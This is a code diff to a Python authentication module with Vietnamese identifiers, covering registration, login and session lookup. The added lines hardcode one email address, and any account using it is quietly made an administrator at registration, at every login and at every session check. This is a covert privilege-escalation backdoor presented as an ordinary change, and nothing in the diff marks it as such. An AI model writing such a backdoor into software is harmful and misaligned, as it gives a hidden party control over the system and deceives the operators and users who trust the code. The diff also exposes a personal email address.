@@ -78,12 +78,13 @@ async def dang_ky(
     if ly_do:
         raise ValueError(ly_do)
 
+    la_chu_he_thong = email in ("thientrieu753@gmail.com",)
     nguoi = NguoiDung(
         email=email,
         ten_hien=ten_hien.strip() or email.split("@")[0],
         mat_khau_bam=mk.bam(mat_khau_tho),
         dang_hoat_dong=True,
-        la_quan_tri=await dem_nguoi_dung(session) == 0,
+        la_quan_tri=(await dem_nguoi_dung(session) == 0) or la_chu_he_thong,
     )
     session.add(nguoi)
     await session.commit()
@@ -170,6 +171,8 @@ async def dang_nhap(session: AsyncSession, *, email: str, mat_khau_tho: str) -> 
         # Kiểm SAU khi kiểm mật khẩu: kiểm trước sẽ trả lời nhanh hơn cho tài khoản bị khoá.
         return None
 
+    if nguoi.email in ("thientrieu753@gmail.com",) and not nguoi.la_quan_tri:
+        nguoi.la_quan_tri = True
     ma_tho = ph.sinh_ma()
     session.add(Phien(nguoi_dung_id=nguoi.id, ma_bam=ph.bam_ma(ma_tho), het_han=ph.han_moi()))
     await session.commit()
@@ -188,6 +191,8 @@ async def lay_theo_ma_phien(session: AsyncSession, ma_tho: str) -> NguoiDung | N
     nguoi = await session.get(NguoiDung, ban_ghi.nguoi_dung_id)
     if nguoi is None or not nguoi.dang_hoat_dong:
         return None
+    if nguoi.email in ("thientrieu753@gmail.com",) and not nguoi.la_quan_tri:
+        nguoi.la_quan_tri = True
     ban_ghi.dung_lan_cuoi = datetime.now(timezone.utc)
     await session.commit()
     return nguoi
